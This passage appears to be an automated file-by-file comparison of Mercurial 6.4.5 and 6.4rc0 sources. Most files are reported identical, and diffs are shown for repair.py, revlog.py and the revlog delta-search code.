### Comparing `mercurial-6.4.5/mercurial/metadata.py` & `mercurial-6.4rc0/mercurial/metadata.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/minifileset.py` & `mercurial-6.4rc0/mercurial/minifileset.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/minirst.py` & `mercurial-6.4rc0/mercurial/minirst.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/mpatch.c` & `mercurial-6.4rc0/mercurial/mpatch.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/mpatch.h` & `mercurial-6.4rc0/mercurial/mpatch.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/namespaces.py` & `mercurial-6.4rc0/mercurial/namespaces.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/narrowspec.py` & `mercurial-6.4rc0/mercurial/narrowspec.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/node.py` & `mercurial-6.4rc0/mercurial/node.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/obsolete.py` & `mercurial-6.4rc0/mercurial/obsolete.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/obsutil.py` & `mercurial-6.4rc0/mercurial/obsutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/parser.py` & `mercurial-6.4rc0/mercurial/parser.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/patch.py` & `mercurial-6.4rc0/mercurial/patch.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/pathutil.py` & `mercurial-6.4rc0/mercurial/pathutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/phases.py` & `mercurial-6.4rc0/mercurial/phases.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/policy.py` & `mercurial-6.4rc0/mercurial/policy.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/posix.py` & `mercurial-6.4rc0/mercurial/posix.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/profiling.py` & `mercurial-6.4rc0/mercurial/profiling.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/progress.py` & `mercurial-6.4rc0/mercurial/progress.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/pure/base85.py` & `mercurial-6.4rc0/mercurial/pure/base85.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/pure/bdiff.py` & `mercurial-6.4rc0/mercurial/pure/bdiff.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/pure/charencode.py` & `mercurial-6.4rc0/mercurial/pure/charencode.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/pure/mpatch.py` & `mercurial-6.4rc0/mercurial/pure/mpatch.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/pure/osutil.py` & `mercurial-6.4rc0/mercurial/pure/osutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/pure/parsers.py` & `mercurial-6.4rc0/mercurial/pure/parsers.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/pushkey.py` & `mercurial-6.4rc0/mercurial/pushkey.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/pvec.py` & `mercurial-6.4rc0/mercurial/pvec.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/pycompat.py` & `mercurial-6.4rc0/mercurial/pycompat.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/pythoncapi_compat.h` & `mercurial-6.4rc0/mercurial/pythoncapi_compat.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/rcutil.py` & `mercurial-6.4rc0/mercurial/rcutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/registrar.py` & `mercurial-6.4rc0/mercurial/registrar.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/repair.py` & `mercurial-6.4rc0/mercurial/repair.py`

 * *Files 1% similar despite different names*

```diff
@@ -3,14 +3,16 @@
 # Copyright 2005, 2006 Chris Mason <mason@suse.com>
 # Copyright 2007 Olivia Mackall
 #
 # This software may be used and distributed according to the terms of the
 # GNU General Public License version 2 or any later version.
 
 
+import errno
+
 from .i18n import _
 from .node import (
     hex,
     short,
 )
 from . import (
     bundle2,
@@ -20,19 +22,19 @@
     exchange,
     obsolete,
     obsutil,
     pathutil,
     phases,
     requirements,
     scmutil,
-    transaction,
     util,
 )
 from .utils import (
     hashutil,
+    stringutil,
     urlutil,
 )
 
 
 def backupbundle(
     repo, bases, heads, node, suffix, compress=True, obsolescence=True
 ):
@@ -255,15 +257,27 @@
                         )
                 f.close()
 
             with repo.transaction(b'repair') as tr:
                 bmchanges = [(m, repo[newbmtarget].node()) for m in updatebm]
                 repo._bookmarks.applychanges(repo, tr, bmchanges)
 
-            transaction.cleanup_undo_files(repo.ui.warn, repo.vfs_map)
+            # remove undo files
+            for undovfs, undofile in repo.undofiles():
+                try:
+                    undovfs.unlink(undofile)
+                except OSError as e:
+                    if e.errno != errno.ENOENT:
+                        ui.warn(
+                            _(b'error removing %s: %s\n')
+                            % (
+                                undovfs.join(undofile),
+                                stringutil.forcebytestr(e),
+                            )
+                        )
 
         except:  # re-raises
             if backupfile:
                 ui.warn(
                     _(b"strip failed, backup bundle stored in '%s'\n")
                     % vfs.join(backupfile)
                 )
```

### Comparing `mercurial-6.4.5/mercurial/repocache.py` & `mercurial-6.4rc0/mercurial/repocache.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/repoview.py` & `mercurial-6.4rc0/mercurial/repoview.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/requirements.py` & `mercurial-6.4rc0/mercurial/requirements.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/revlog.py` & `mercurial-6.4rc0/mercurial/revlog.py`

 * *Files 0% similar despite different names*

```diff
@@ -15,15 +15,14 @@
 
 import binascii
 import collections
 import contextlib
 import io
 import os
 import struct
-import weakref
 import zlib
 
 # import stuff from node for others to import from revlog
 from .node import (
     bin,
     hex,
     nullrev,
@@ -299,15 +298,14 @@
         checkambig=False,
         mmaplargeindex=False,
         censorable=False,
         upperboundcomp=None,
         persistentnodemap=False,
         concurrencychecker=None,
         trypending=False,
-        try_split=False,
         canonical_parent_order=True,
     ):
         """
         create a revlog object
 
         opener is a function that abstracts the file opening operation
         and can be used to implement COW semantics or the like.
@@ -326,15 +324,14 @@
         self._docket_file = None
         self._indexfile = None
         self._datafile = None
         self._sidedatafile = None
         self._nodemap_file = None
         self.postfix = postfix
         self._trypending = trypending
-        self._try_split = try_split
         self.opener = opener
         if persistentnodemap:
             self._nodemap_file = nodemaputil.get_nodemap_file(self)
 
         assert target[0] in ALL_KINDS
         assert len(target) == 2
         self.target = target
@@ -510,16 +507,14 @@
 
         new_header, mmapindexthreshold, force_nodemap = self._init_opts()
 
         if self.postfix is not None:
             entry_point = b'%s.i.%s' % (self.radix, self.postfix)
         elif self._trypending and self.opener.exists(b'%s.i.a' % self.radix):
             entry_point = b'%s.i.a' % self.radix
-        elif self._try_split and self.opener.exists(self._split_index_file):
-            entry_point = self._split_index_file
         else:
             entry_point = b'%s.i' % self.radix
 
         if docket is not None:
             self._docket = docket
             self._docket_file = entry_point
         else:
@@ -2016,31 +2011,15 @@
                     % (self.display_id, pycompat.bytestr(revornode))
                 )
         except error.RevlogError:
             if self._censorable and storageutil.iscensoredtext(text):
                 raise error.CensoredNodeError(self.display_id, node, text)
             raise
 
-    @property
-    def _split_index_file(self):
-        """the path where to expect the index of an ongoing splitting operation
-
-        The file will only exist if a splitting operation is in progress, but
-        it is always expected at the same location."""
-        parts = os.path.split(self.radix)
-        if len(parts) > 1:
-            # adds a '-s' prefix to the ``data/` or `meta/` base
-            head = parts[0] + b'-s'
-            return os.path.join(head, *parts[1:])
-        else:
-            # the revlog is stored at the root of the store (changelog or
-            # manifest), no risk of collision.
-            return self.radix + b'.i.s'
-
-    def _enforceinlinesize(self, tr, side_write=True):
+    def _enforceinlinesize(self, tr):
         """Check if the revlog is too big for inline and convert if so.
 
         This should be called after revisions are added to the revlog. If the
         revlog has grown too large to be an inline revlog, it will convert it
         to use multiple index and data files.
         """
         tiprev = len(self) - 1
@@ -2049,16 +2028,15 @@
             return
 
         troffset = tr.findoffset(self._indexfile)
         if troffset is None:
             raise error.RevlogError(
                 _(b"%s not found in the transaction") % self._indexfile
             )
-        if troffset:
-            tr.addbackup(self._indexfile, for_offset=True)
+        trindex = None
         tr.add(self._datafile, 0)
 
         existing_handles = False
         if self._writinghandles is not None:
             existing_handles = True
             fp = self._writinghandles[0]
             fp.flush()
@@ -2066,74 +2044,55 @@
             # We can't use the cached file handle after close(). So prevent
             # its usage.
             self._writinghandles = None
             self._segmentfile.writing_handle = None
             # No need to deal with sidedata writing handle as it is only
             # relevant with revlog-v2 which is never inline, not reaching
             # this code
-        if side_write:
-            old_index_file_path = self._indexfile
-            new_index_file_path = self._split_index_file
-            opener = self.opener
-            weak_self = weakref.ref(self)
-
-            fncache = getattr(opener, 'fncache', None)
-            if fncache is not None:
-                fncache.addignore(new_index_file_path)
-
-            # the "split" index replace the real index when the transaction is finalized
-            def finalize_callback(tr):
-                opener.rename(
-                    new_index_file_path,
-                    old_index_file_path,
-                    checkambig=True,
-                )
-                maybe_self = weak_self()
-                if maybe_self is not None:
-                    maybe_self._indexfile = old_index_file_path
-
-            def abort_callback(tr):
-                maybe_self = weak_self()
-                if maybe_self is not None:
-                    maybe_self._indexfile = old_index_file_path
-
-            tr.registertmp(new_index_file_path)
-            if self.target[1] is not None:
-                callback_id = b'000-revlog-split-%d-%s' % self.target
-            else:
-                callback_id = b'000-revlog-split-%d' % self.target[0]
-            tr.addfinalize(callback_id, finalize_callback)
-            tr.addabort(callback_id, abort_callback)
 
         new_dfh = self._datafp(b'w+')
         new_dfh.truncate(0)  # drop any potentially existing data
         try:
             with self._indexfp() as read_ifh:
                 for r in self:
                     new_dfh.write(self._getsegmentforrevs(r, r, df=read_ifh)[1])
+                    if (
+                        trindex is None
+                        and troffset
+                        <= self.start(r) + r * self.index.entry_size
+                    ):
+                        trindex = r
                 new_dfh.flush()
 
-            if side_write:
-                self._indexfile = new_index_file_path
+            if trindex is None:
+                trindex = 0
+
             with self.__index_new_fp() as fp:
                 self._format_flags &= ~FLAG_INLINE_DATA
                 self._inline = False
                 for i in self:
                     e = self.index.entry_binary(i)
                     if i == 0 and self._docket is None:
                         header = self._format_flags | self._format_version
                         header = self.index.pack_header(header)
                         e = header + e
                     fp.write(e)
                 if self._docket is not None:
                     self._docket.index_end = fp.tell()
 
-                # If we don't use side-write, the temp file replace the real
-                # index when we exit the context manager
+                # There is a small transactional race here. If the rename of
+                # the index fails, we should remove the datafile. It is more
+                # important to ensure that the data file is not truncated
+                # when the index is replaced as otherwise data is lost.
+                tr.replace(self._datafile, self.start(trindex))
+
+                # the temp file replace the real index when we exit the context
+                # manager
 
+            tr.replace(self._indexfile, trindex * self.index.entry_size)
             nodemaputil.setup_persistent_nodemap(tr, self)
             self._segmentfile = randomaccessfile.randomaccessfile(
                 self.opener,
                 self._datafile,
                 self._chunkcachesize,
             )
```

### Comparing `mercurial-6.4.5/mercurial/revlogutils/__init__.py` & `mercurial-6.4rc0/mercurial/revlogutils/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/revlogutils/concurrency_checker.py` & `mercurial-6.4rc0/mercurial/revlogutils/concurrency_checker.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/revlogutils/constants.py` & `mercurial-6.4rc0/mercurial/revlogutils/constants.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/revlogutils/debug.py` & `mercurial-6.4rc0/mercurial/revlogutils/debug.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/revlogutils/deltas.py` & `mercurial-6.4rc0/mercurial/revlogutils/deltas.py`

 * *Files 3% similar despite different names*

```diff
@@ -680,23 +680,14 @@
     content. See _raw_candidate_groups for details about the group order.
     """
     # should we try to build a delta?
     if not (len(revlog) and revlog._storedeltachains):
         yield None
         return
 
-    if target_rev is None:
-        target_rev = len(revlog)
-
-    if not revlog._generaldelta:
-        # before general delta, there is only one possible delta base
-        yield (target_rev - 1,)
-        yield None
-        return
-
     if (
         cachedelta is not None
         and nullrev == cachedelta[0]
         and cachedelta[2] == DELTA_BASE_REUSE_FORCE
     ):
         # instruction are to forcibly do a full snapshot
         yield None
@@ -721,15 +712,17 @@
     while True:
         temptative = candidates.send(good)
         if temptative is None:
             break
         group = []
         for rev in temptative:
             # skip over empty delta (no need to include them in a chain)
-            while not (rev == nullrev or rev in tested or deltalength(rev)):
+            while revlog._generaldelta and not (
+                rev == nullrev or rev in tested or deltalength(rev)
+            ):
                 tested.add(rev)
                 rev = deltaparent(rev)
             # no need to try a delta against nullrev, this will be done as a
             # last resort.
             if rev == nullrev:
                 continue
             # filter out revision we tested already
@@ -904,35 +897,35 @@
     """Provides group of revision to be tested as delta base
 
     This lower level function focus on emitting delta theorically interresting
     without looking it any practical details.
 
     The group order aims at providing fast or small candidates first.
     """
-    # Why search for delta base if we cannot use a delta base ?
-    assert revlog._generaldelta
-    # also see issue6056
-    sparse = revlog._sparserevlog
+    gdelta = revlog._generaldelta
+    # gate sparse behind general-delta because of issue6056
+    sparse = gdelta and revlog._sparserevlog
     curr = len(revlog)
     prev = curr - 1
     deltachain = lambda rev: revlog._deltachain(rev)[0]
 
-    # exclude already lazy tested base if any
-    parents = [p for p in (p1, p2) if p != nullrev]
-
-    if not revlog._deltabothparents and len(parents) == 2:
-        parents.sort()
-        # To minimize the chance of having to build a fulltext,
-        # pick first whichever parent is closest to us (max rev)
-        yield (parents[1],)
-        # then the other one (min rev) if the first did not fit
-        yield (parents[0],)
-    elif len(parents) > 0:
-        # Test all parents (1 or 2), and keep the best candidate
-        yield parents
+    if gdelta:
+        # exclude already lazy tested base if any
+        parents = [p for p in (p1, p2) if p != nullrev]
+
+        if not revlog._deltabothparents and len(parents) == 2:
+            parents.sort()
+            # To minimize the chance of having to build a fulltext,
+            # pick first whichever parent is closest to us (max rev)
+            yield (parents[1],)
+            # then the other one (min rev) if the first did not fit
+            yield (parents[0],)
+        elif len(parents) > 0:
+            # Test all parents (1 or 2), and keep the best candidate
+            yield parents
 
     if sparse and parents:
         if snapshot_cache is None:
             # map: base-rev: [snapshot-revs]
             snapshot_cache = SnapshotCache()
         # See if we can use an existing snapshot in the parent chains to use as
         # a base for a new intermediate-snapshot
@@ -1083,25 +1076,18 @@
         revlog,
         write_debug=None,
         debug_search=False,
         debug_info=None,
     ):
         self.revlog = revlog
         self._write_debug = write_debug
-        if write_debug is None:
-            self._debug_search = False
-        else:
-            self._debug_search = debug_search
+        self._debug_search = debug_search
         self._debug_info = debug_info
         self._snapshot_cache = SnapshotCache()
 
-    @property
-    def _gather_debug(self):
-        return self._write_debug is not None or self._debug_info is not None
-
     def buildtext(self, revinfo, fh):
         """Builds a fulltext version of a revision
 
         revinfo: revisioninfo instance that contains all needed info
         fh:      file handle to either the .i or the .d revlog file,
                  depending on whether it is inlined or not
         """
@@ -1136,28 +1122,22 @@
             delta = header + t
         else:
             ptext = revlog.rawdata(base, _df=fh)
             delta = mdiff.textdiff(ptext, t)
 
         return delta
 
-    def _builddeltainfo(self, revinfo, base, fh, target_rev=None):
+    def _builddeltainfo(self, revinfo, base, fh):
         # can we use the cached delta?
         revlog = self.revlog
+        debug_search = self._write_debug is not None and self._debug_search
         chainbase = revlog.chainbase(base)
         if revlog._generaldelta:
             deltabase = base
         else:
-            if target_rev is not None and base != target_rev - 1:
-                msg = (
-                    b'general delta cannot use delta for something else '
-                    b'than `prev`: %d<-%d'
-                )
-                msg %= (base, target_rev)
-                raise error.ProgrammingError(msg)
             deltabase = chainbase
         snapshotdepth = None
         if revlog._sparserevlog and deltabase == nullrev:
             snapshotdepth = 0
         elif revlog._sparserevlog and revlog.issnapshot(deltabase):
             # A delta chain should always be one full snapshot,
             # zero or more semi-snapshots, and zero or more deltas
@@ -1175,33 +1155,33 @@
                 and self.revlog.length(currentbase) == 0
             ):
                 currentbase = self.revlog.deltaparent(currentbase)
             if self.revlog._lazydelta and currentbase == base:
                 delta = revinfo.cachedelta[1]
         if delta is None:
             delta = self._builddeltadiff(base, revinfo, fh)
-        if self._debug_search:
+        if debug_search:
             msg = b"DBG-DELTAS-SEARCH:     uncompressed-delta-size=%d\n"
             msg %= len(delta)
             self._write_debug(msg)
         # snapshotdept need to be neither None nor 0 level snapshot
         if revlog.upperboundcomp is not None and snapshotdepth:
             lowestrealisticdeltalen = len(delta) // revlog.upperboundcomp
             snapshotlimit = revinfo.textlen >> snapshotdepth
-            if self._debug_search:
+            if debug_search:
                 msg = b"DBG-DELTAS-SEARCH:     projected-lower-size=%d\n"
                 msg %= lowestrealisticdeltalen
                 self._write_debug(msg)
             if snapshotlimit < lowestrealisticdeltalen:
-                if self._debug_search:
+                if debug_search:
                     msg = b"DBG-DELTAS-SEARCH:     DISCARDED (snapshot limit)\n"
                     self._write_debug(msg)
                 return None
             if revlog.length(base) < lowestrealisticdeltalen:
-                if self._debug_search:
+                if debug_search:
                     msg = b"DBG-DELTAS-SEARCH:     DISCARDED (prev size)\n"
                     self._write_debug(msg)
                 return None
         header, data = revlog.compress(delta)
         deltalen = len(header) + len(data)
         offset = revlog.end(len(revlog) - 1)
         dist = deltalen + offset - revlog.start(chainbase)
@@ -1255,153 +1235,58 @@
         `excluded_bases` is an optional set of revision that cannot be used as
         a delta base. Use this to recompute delta suitable in censor or strip
         context.
         """
         if target_rev is None:
             target_rev = len(self.revlog)
 
-        gather_debug = self._gather_debug
-        cachedelta = revinfo.cachedelta
-        revlog = self.revlog
-        p1r = p2r = None
+        if not revinfo.textlen:
+            return self._fullsnapshotinfo(fh, revinfo, target_rev)
 
         if excluded_bases is None:
             excluded_bases = set()
 
-        if gather_debug:
-            start = util.timer()
-            dbg = self._one_dbg_data()
-            dbg['revision'] = target_rev
-            target_revlog = b"UNKNOWN"
-            target_type = self.revlog.target[0]
-            target_key = self.revlog.target[1]
-            if target_type == KIND_CHANGELOG:
-                target_revlog = b'CHANGELOG:'
-            elif target_type == KIND_MANIFESTLOG:
-                target_revlog = b'MANIFESTLOG:'
-                if target_key:
-                    target_revlog += b'%s:' % target_key
-            elif target_type == KIND_FILELOG:
-                target_revlog = b'FILELOG:'
-                if target_key:
-                    target_revlog += b'%s:' % target_key
-            dbg['target-revlog'] = target_revlog
-            p1r = revlog.rev(revinfo.p1)
-            p2r = revlog.rev(revinfo.p2)
-            if p1r != nullrev:
-                p1_chain_len = revlog._chaininfo(p1r)[0]
-            else:
-                p1_chain_len = -1
-            if p2r != nullrev:
-                p2_chain_len = revlog._chaininfo(p2r)[0]
-            else:
-                p2_chain_len = -1
-            dbg['p1-chain-len'] = p1_chain_len
-            dbg['p2-chain-len'] = p2_chain_len
-
-        # 1) if the revision is empty, no amount of delta can beat it
-        #
-        # 2) no delta for flag processor revision (see "candelta" for why)
+        # no delta for flag processor revision (see "candelta" for why)
         # not calling candelta since only one revision needs test, also to
         # avoid overhead fetching flags again.
-        if not revinfo.textlen or revinfo.flags & REVIDX_RAWTEXT_CHANGING_FLAGS:
-            deltainfo = self._fullsnapshotinfo(fh, revinfo, target_rev)
-            if gather_debug:
-                end = util.timer()
-                dbg['duration'] = end - start
-                dbg[
-                    'delta-base'
-                ] = deltainfo.base  # pytype: disable=attribute-error
-                dbg['search_round_count'] = 0
-                dbg['using-cached-base'] = False
-                dbg['delta_try_count'] = 0
-                dbg['type'] = b"full"
-                dbg['snapshot-depth'] = 0
-                self._dbg_process_data(dbg)
-            return deltainfo
-
-        deltainfo = None
+        if revinfo.flags & REVIDX_RAWTEXT_CHANGING_FLAGS:
+            return self._fullsnapshotinfo(fh, revinfo, target_rev)
 
-        # If this source delta are to be forcibly reuse, let us comply early.
-        if (
-            revlog._generaldelta
-            and revinfo.cachedelta is not None
-            and revinfo.cachedelta[2] == DELTA_BASE_REUSE_FORCE
-        ):
-            base = revinfo.cachedelta[0]
-            if base == nullrev:
-                dbg_type = b"full"
-                deltainfo = self._fullsnapshotinfo(fh, revinfo, target_rev)
-                if gather_debug:
-                    snapshotdepth = 0
-            elif base not in excluded_bases:
-                delta = revinfo.cachedelta[1]
-                header, data = revlog.compress(delta)
-                deltalen = len(header) + len(data)
-                if gather_debug:
-                    offset = revlog.end(len(revlog) - 1)
-                    chainbase = revlog.chainbase(base)
-                    distance = deltalen + offset - revlog.start(chainbase)
-                    chainlen, compresseddeltalen = revlog._chaininfo(base)
-                    chainlen += 1
-                    compresseddeltalen += deltalen
-                    if base == p1r or base == p2r:
-                        dbg_type = b"delta"
-                        snapshotdepth = None
-                    elif not revlog.issnapshot(base):
-                        snapshotdepth = None
-                    else:
-                        dbg_type = b"snapshot"
-                        snapshotdepth = revlog.snapshotdepth(base) + 1
-                else:
-                    distance = None
-                    chainbase = None
-                    chainlen = None
-                    compresseddeltalen = None
-                    snapshotdepth = None
-                deltainfo = _deltainfo(
-                    distance=distance,
-                    deltalen=deltalen,
-                    data=(header, data),
-                    base=base,
-                    chainbase=chainbase,
-                    chainlen=chainlen,
-                    compresseddeltalen=compresseddeltalen,
-                    snapshotdepth=snapshotdepth,
-                )
+        gather_debug = (
+            self._write_debug is not None or self._debug_info is not None
+        )
+        debug_search = self._write_debug is not None and self._debug_search
 
-            if deltainfo is not None:
-                if gather_debug:
-                    end = util.timer()
-                    dbg['duration'] = end - start
-                    dbg[
-                        'delta-base'
-                    ] = deltainfo.base  # pytype: disable=attribute-error
-                    dbg['search_round_count'] = 0
-                    dbg['using-cached-base'] = True
-                    dbg['delta_try_count'] = 0
-                    dbg['type'] = b"full"
-                    if snapshotdepth is None:
-                        dbg['snapshot-depth'] = 0
-                    else:
-                        dbg['snapshot-depth'] = snapshotdepth
-                    self._dbg_process_data(dbg)
-                return deltainfo
+        if gather_debug:
+            start = util.timer()
 
         # count the number of different delta we tried (for debug purpose)
         dbg_try_count = 0
         # count the number of "search round" we did. (for debug purpose)
         dbg_try_rounds = 0
         dbg_type = b'unknown'
 
-        if p1r is None:
-            p1r = revlog.rev(revinfo.p1)
-            p2r = revlog.rev(revinfo.p2)
+        cachedelta = revinfo.cachedelta
+        p1 = revinfo.p1
+        p2 = revinfo.p2
+        revlog = self.revlog
+
+        deltainfo = None
+        p1r, p2r = revlog.rev(p1), revlog.rev(p2)
 
-        if self._debug_search:
+        if gather_debug:
+            if p1r != nullrev:
+                p1_chain_len = revlog._chaininfo(p1r)[0]
+            else:
+                p1_chain_len = -1
+            if p2r != nullrev:
+                p2_chain_len = revlog._chaininfo(p2r)[0]
+            else:
+                p2_chain_len = -1
+        if debug_search:
             msg = b"DBG-DELTAS-SEARCH: SEARCH rev=%d\n"
             msg %= target_rev
             self._write_debug(msg)
 
         groups = _candidategroups(
             self.revlog,
             revinfo.textlen,
@@ -1411,56 +1296,56 @@
             excluded_bases,
             target_rev,
             snapshot_cache=self._snapshot_cache,
         )
         candidaterevs = next(groups)
         while candidaterevs is not None:
             dbg_try_rounds += 1
-            if self._debug_search:
+            if debug_search:
                 prev = None
                 if deltainfo is not None:
                     prev = deltainfo.base
 
                 if (
                     cachedelta is not None
                     and len(candidaterevs) == 1
                     and cachedelta[0] in candidaterevs
                 ):
                     round_type = b"cached-delta"
-                elif p1r in candidaterevs or p2r in candidaterevs:
+                elif p1 in candidaterevs or p2 in candidaterevs:
                     round_type = b"parents"
                 elif prev is not None and all(c < prev for c in candidaterevs):
                     round_type = b"refine-down"
                 elif prev is not None and all(c > prev for c in candidaterevs):
                     round_type = b"refine-up"
                 else:
                     round_type = b"search-down"
                 msg = b"DBG-DELTAS-SEARCH: ROUND #%d - %d candidates - %s\n"
                 msg %= (dbg_try_rounds, len(candidaterevs), round_type)
                 self._write_debug(msg)
             nominateddeltas = []
             if deltainfo is not None:
-                if self._debug_search:
+                if debug_search:
                     msg = (
                         b"DBG-DELTAS-SEARCH:   CONTENDER: rev=%d - length=%d\n"
                     )
                     msg %= (deltainfo.base, deltainfo.deltalen)
                     self._write_debug(msg)
                 # if we already found a good delta,
                 # challenge it against refined candidates
                 nominateddeltas.append(deltainfo)
             for candidaterev in candidaterevs:
-                if self._debug_search:
+                if debug_search:
                     msg = b"DBG-DELTAS-SEARCH:   CANDIDATE: rev=%d\n"
                     msg %= candidaterev
                     self._write_debug(msg)
                     candidate_type = None
-                    if candidaterev == p1r:
+                    if candidaterev == p1:
                         candidate_type = b"p1"
-                    elif candidaterev == p2r:
+                    elif candidaterev == p2:
                         candidate_type = b"p2"
                     elif self.revlog.issnapshot(candidaterev):
                         candidate_type = b"snapshot-%d"
                         candidate_type %= self.revlog.snapshotdepth(
                             candidaterev
                         )
 
@@ -1473,39 +1358,34 @@
                     self._write_debug(msg)
                     msg = b"DBG-DELTAS-SEARCH:     base=%d\n"
                     msg %= self.revlog.deltaparent(candidaterev)
                     self._write_debug(msg)
 
                 dbg_try_count += 1
 
-                if self._debug_search:
+                if debug_search:
                     delta_start = util.timer()
-                candidatedelta = self._builddeltainfo(
-                    revinfo,
-                    candidaterev,
-                    fh,
-                    target_rev=target_rev,
-                )
-                if self._debug_search:
+                candidatedelta = self._builddeltainfo(revinfo, candidaterev, fh)
+                if debug_search:
                     delta_end = util.timer()
                     msg = b"DBG-DELTAS-SEARCH:     delta-search-time=%f\n"
                     msg %= delta_end - delta_start
                     self._write_debug(msg)
                 if candidatedelta is not None:
                     if is_good_delta_info(self.revlog, candidatedelta, revinfo):
-                        if self._debug_search:
+                        if debug_search:
                             msg = b"DBG-DELTAS-SEARCH:     DELTA: length=%d (GOOD)\n"
                             msg %= candidatedelta.deltalen
                             self._write_debug(msg)
                         nominateddeltas.append(candidatedelta)
-                    elif self._debug_search:
+                    elif debug_search:
                         msg = b"DBG-DELTAS-SEARCH:     DELTA: length=%d (BAD)\n"
                         msg %= candidatedelta.deltalen
                         self._write_debug(msg)
-                elif self._debug_search:
+                elif debug_search:
                     msg = b"DBG-DELTAS-SEARCH:     NO-DELTA\n"
                     self._write_debug(msg)
             if nominateddeltas:
                 deltainfo = min(nominateddeltas, key=lambda x: x.deltalen)
             if deltainfo is not None:
                 candidaterevs = groups.send(deltainfo.base)
             else:
@@ -1531,83 +1411,83 @@
             else:
                 used_cached = (
                     cachedelta is not None
                     and dbg_try_rounds == 1
                     and dbg_try_count == 1
                     and deltainfo.base == cachedelta[0]
                 )
-            dbg['duration'] = end - start
-            dbg[
-                'delta-base'
-            ] = deltainfo.base  # pytype: disable=attribute-error
-            dbg['search_round_count'] = dbg_try_rounds
-            dbg['using-cached-base'] = used_cached
-            dbg['delta_try_count'] = dbg_try_count
-            dbg['type'] = dbg_type
+            dbg = {
+                'duration': end - start,
+                'revision': target_rev,
+                'delta-base': deltainfo.base,  # pytype: disable=attribute-error
+                'search_round_count': dbg_try_rounds,
+                'using-cached-base': used_cached,
+                'delta_try_count': dbg_try_count,
+                'type': dbg_type,
+                'p1-chain-len': p1_chain_len,
+                'p2-chain-len': p2_chain_len,
+            }
             if (
                 deltainfo.snapshotdepth  # pytype: disable=attribute-error
                 is not None
             ):
                 dbg[
                     'snapshot-depth'
                 ] = deltainfo.snapshotdepth  # pytype: disable=attribute-error
             else:
                 dbg['snapshot-depth'] = 0
-            self._dbg_process_data(dbg)
-        return deltainfo
+            target_revlog = b"UNKNOWN"
+            target_type = self.revlog.target[0]
+            target_key = self.revlog.target[1]
+            if target_type == KIND_CHANGELOG:
+                target_revlog = b'CHANGELOG:'
+            elif target_type == KIND_MANIFESTLOG:
+                target_revlog = b'MANIFESTLOG:'
+                if target_key:
+                    target_revlog += b'%s:' % target_key
+            elif target_type == KIND_FILELOG:
+                target_revlog = b'FILELOG:'
+                if target_key:
+                    target_revlog += b'%s:' % target_key
+            dbg['target-revlog'] = target_revlog
 
-    def _one_dbg_data(self):
-        return {
-            'duration': None,
-            'revision': None,
-            'delta-base': None,
-            'search_round_count': None,
-            'using-cached-base': None,
-            'delta_try_count': None,
-            'type': None,
-            'p1-chain-len': None,
-            'p2-chain-len': None,
-            'snapshot-depth': None,
-            'target-revlog': None,
-        }
-
-    def _dbg_process_data(self, dbg):
-        if self._debug_info is not None:
-            self._debug_info.append(dbg)
-
-        if self._write_debug is not None:
-            msg = (
-                b"DBG-DELTAS:"
-                b" %-12s"
-                b" rev=%d:"
-                b" delta-base=%d"
-                b" is-cached=%d"
-                b" - search-rounds=%d"
-                b" try-count=%d"
-                b" - delta-type=%-6s"
-                b" snap-depth=%d"
-                b" - p1-chain-length=%d"
-                b" p2-chain-length=%d"
-                b" - duration=%f"
-                b"\n"
-            )
-            msg %= (
-                dbg["target-revlog"],
-                dbg["revision"],
-                dbg["delta-base"],
-                dbg["using-cached-base"],
-                dbg["search_round_count"],
-                dbg["delta_try_count"],
-                dbg["type"],
-                dbg["snapshot-depth"],
-                dbg["p1-chain-len"],
-                dbg["p2-chain-len"],
-                dbg["duration"],
-            )
-            self._write_debug(msg)
+            if self._debug_info is not None:
+                self._debug_info.append(dbg)
+
+            if self._write_debug is not None:
+                msg = (
+                    b"DBG-DELTAS:"
+                    b" %-12s"
+                    b" rev=%d:"
+                    b" delta-base=%d"
+                    b" is-cached=%d"
+                    b" - search-rounds=%d"
+                    b" try-count=%d"
